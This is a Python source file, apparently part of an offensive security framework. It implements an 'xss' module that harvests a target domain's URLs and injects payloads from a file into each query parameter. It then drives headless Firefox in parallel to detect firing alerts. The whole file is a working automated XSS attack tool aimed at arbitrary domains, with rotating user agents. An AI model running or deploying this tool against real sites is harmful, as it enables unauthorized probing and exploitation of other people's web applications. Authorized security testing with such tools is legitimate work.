import concurrent.futures
import urllib.parse
import asyncio
import random
import re

from pathlib import Path
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from selenium.common.exceptions import TimeoutException

# noinspection PyUnresolvedReferences
from src.provider import *

from src.module.base.BaseModule import BaseModule
from src.core.registry.Registry import ModuleRegistry, OptionRegistry, ProviderRegistry

from prompt_toolkit.shortcuts import PromptSession
from prompt_toolkit.styles import Style


prompt_style = Style.from_dict({"prompt": "ansired bold"})

user_agents: list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0"
]

xss_payloads: list = []


class XSSModule(BaseModule):

    helper: dict = {
        'name': 'xss',
        'help': 'This module sets up a XSS param injection attack',
        'usage': 'use xss'
    }

    options: dict = {
        'module': {
            'domain': [
                'malicious.group',
                'The target domain name to gather URLs for',
                ''
            ],
            'sub-domains': [
                'true',
                'Enable this option to also include sub-domains for target domain',
                'true,false'
            ],
            'payload_file': [
                'assets/xss/xss_custom.txt',
                'File containing XSS payloads (one per line)',
                ''
            ],
            'workers': [
                '4',
                'The amount of workers to run in parallel',
                ''
            ],
            'custom_urls': [
                'custom_urls.txt',
                'A custom URL(s) file containing URL targets',
                ''
            ]
        }
    }

    def __init__(self, command: str, print_queue: asyncio.Queue, console: object):
        super().__init__()
        self.command: str = command
        self.console: object = console
        self.random_int: int = random.randint(111111111, 999999999)
        self.print_queue: asyncio.Queue = print_queue
        self.module_register: ModuleRegistry = ModuleRegistry()
        self.option_register: OptionRegistry = OptionRegistry()
        self.provider_register: ProviderRegistry = ProviderRegistry()

    async def register(self) -> None:
        self.option_register.register_options(options=self.options)

    async def unregister(self) -> None:
        options: dict = self.option_register.dump_register()
        if 'module' in options.keys():
            options.pop('module')
            self.option_register.register_options(options)

    async def main(self) -> None:
        await self.register()
        await self.module_shell()

    async def module_shell(self) -> None:
        session: PromptSession = PromptSession()
        allowed_commands: list = ['set', 'options', 'run', 'back']
        while True:
            try:
                prompt_text: str = self.option_register.get_register('prompt_text')
                sub_prompt: str = f"{prompt_text} [{self.helper['name']}] > "
                data: str = await session.prompt_async(sub_prompt, style=prompt_style)
                if not data or not data.startswith(tuple(allowed_commands)):
                    continue
                if data.startswith(tuple(['back', 'exit'])):
                    raise EOFError
                if data.startswith(tuple(['set', 'options'])):
                    # noinspection PyUnresolvedReferences
                    await self.console.command_interpreter(data)
                if data.startswith(tuple(['run', 'exploit'])):
                    await self.execute()
            except (EOFError, KeyboardInterrupt):
                await self.unregister()
                break

    async def execute(self) -> None:
        domain: str = self.option_register.get_register('domain')
        sub_domains = True if self.option_register.get_register('sub-domains') == 'true' else False
        payload_file: str = self.option_register.get_register('payload_file')
        workers: int = int(self.option_register.get_register('workers'))
        custom_urls: str = self.option_register.get_register('custom_urls')
        xss_param_urls: list = []
        param_urls: list = []
        urls: list = []

        if not all([domain, sub_domains, payload_file, workers]):
            await self.print_queue.put(('error', f"Missing XSS required options\n"))
            return

        if custom_urls and Path(custom_urls).is_file():
            await self.print_queue.put(('success', f"[+] [{domain}] - Gathering Custom URL data"))
            try:
                with open(custom_urls) as fp:
                    for count, line in enumerate(fp):
                        urls.append(str(line).rstrip('\n'))
                    await self.print_queue.put(
                        ('success', f"[+] [Custom] - {len(urls)} entries added to attack list\n"))
            except OSError:
                await self.print_queue.put(('error', f"[x] Error opening the Custom URL file '{custom_urls}'\n"))

        if Path(payload_file).is_file():
            await self.print_queue.put(('success', f"[+] [XSS] - Gathering XSS Payloads from '{payload_file}'"))
            try:
                with open(payload_file, encoding="utf-8") as fp:
                    for count, line in enumerate(fp):
                        xss_payloads.append(str(line).rstrip('\n'))
                    await self.print_queue.put(
                        ('success', f"[+] [XSS] - {len(xss_payloads)} XSS payloads added to attack list\n"))
            except OSError:
                await self.print_queue.put(('error', f"[x] Error opening the XSS Payloads file '{payload_file}'\n"))

        urls += await self.gather_urls(domain, sub_domains)
        for p_url in urls:
            output: list = await self.extract_params(p_url)
            if not output:
                continue
            param_urls += output

        if len(urls) == 0:
            await self.print_queue.put(('warning', f"[x] No targets detected for the target domain '{domain}'\n"))
            return

        await self.print_queue.put((
            'success',
            f"[+] Collection process found {len(urls)} unique URL(s) with {len(param_urls)} individual parameters\n"))
        await asyncio.sleep(1)

        await self.print_queue.put(('success', f"[+] Processing all the XSS injection points using provided URL list"))
        await asyncio.sleep(1)
        for payload in xss_payloads:
            for param in param_urls:
                param = param.replace('XSS_TEST', payload)
                xss_param_urls.append(param)

        await self.print_queue.put(('success', f"[-] Processed {len(xss_param_urls)} XSS injection points\n"))
        await asyncio.sleep(1)

        confirm: str = input(f"About to run XSS attacks on {len(xss_param_urls)} URL(s).  Are you sure? [Y/n]: ")
        if confirm.startswith(tuple(['N', 'n'])):
            await self.print_queue.put(('warning', f"[x] User Aborting SSRF attack on the target domain '{domain}'.\n"))
            return

        await self.print_queue.put('')
        await self.print_queue.put(
            ('bold', f"[*] Starting XSS Parameter Injection attack on {len(xss_param_urls)} URLs\n"))
        await asyncio.sleep(0.25)
        await self.param_injection(xss_param_urls, workers)

    async def param_injection(self, urls: list, workers: int):
        work_queue: asyncio.Queue = asyncio.Queue()
        executor = concurrent.futures.ThreadPoolExecutor()
        for url in urls:
            await work_queue.put(url)

        loop = asyncio.get_event_loop()
        try:
            blocking_io = [loop.run_in_executor(
                executor,
                self.fetch_url,
                work_queue
            ) for _ in range(workers)]
            completed, pending = await asyncio.wait(blocking_io)
            _ = [t.result() for t in completed]
        except KeyboardInterrupt:
            await self.print_queue.put(('warning', f"[*] User supplied abort signal.\n"))
            return

    def fetch_url(self, work_queue: asyncio.Queue):
        gecko_driver = self.option_register.get_register('gecko_driver')
        while work_queue.empty() is not True:
            url: str = work_queue.get_nowait()
            url = url.replace("alert(1)", f"alert({self.random_int})")
            opts = Options()
            opts.headless = True
            driver = webdriver.Firefox(options=opts, executable_path=gecko_driver)
            try:
                driver.get(url)
                WebDriverWait(driver, 5).until(ec.alert_is_present())
                alert = driver.switch_to.alert
                if str(self.random_int) in alert.text:
                    self.print_queue.put_nowait(('success', f"{url}"))
                    with open(f"xss_report.txt", 'w') as f:
                        f.write(f"SUCCESS --> {url}")
                else:
                    self.print_queue.put_nowait(('warning', f"{url}"))
                    with open(f"xss_report", 'w') as f:
                        f.write(f"POSSIBLY --> {url}")
                alert.accept()
            except TimeoutException:
                self.print_queue.put_nowait(('error', f"{url}"))
            except (Exception, KeyboardInterrupt) as e:
                print(f"ERROR:ERROR {e.__str__()}")
                raise KeyboardInterrupt
            finally:
                driver.quit()

    async def gather_urls(self, domain: str, sub_domains: bool):
        providers = self.provider_register.dump_register()
        urls_stub: list = []
        for provider in providers:
            if not asyncio.iscoroutinefunction(providers[provider].get_data_set):
                continue
            x: list = await providers[provider](self.print_queue, domain, sub_domains).get_data_set()
            urls_stub = urls_stub + x
        return list(set(urls_stub))

    @staticmethod
    async def extract_params(url: str) -> list:
        placeholder: str = "XSS_TEST"
        parsed: list = list(re.findall(r'.*?:\/\/.*\?.*\=.+[^$]', url))
        final_urls: list = []

        for p_url in parsed:
            url_parts: list = list(urllib.parse.urlparse(p_url))
            query: dict = dict(urllib.parse.parse_qsl(url_parts[4]))
            for x in query:
                original_value = query[x]
                query[x] = placeholder
                url_parts[4] = urllib.parse.urlencode(query)
                final_urls.append(urllib.parse.urlunparse(url_parts))
                query[x] = original_value

        return list(set(final_urls))
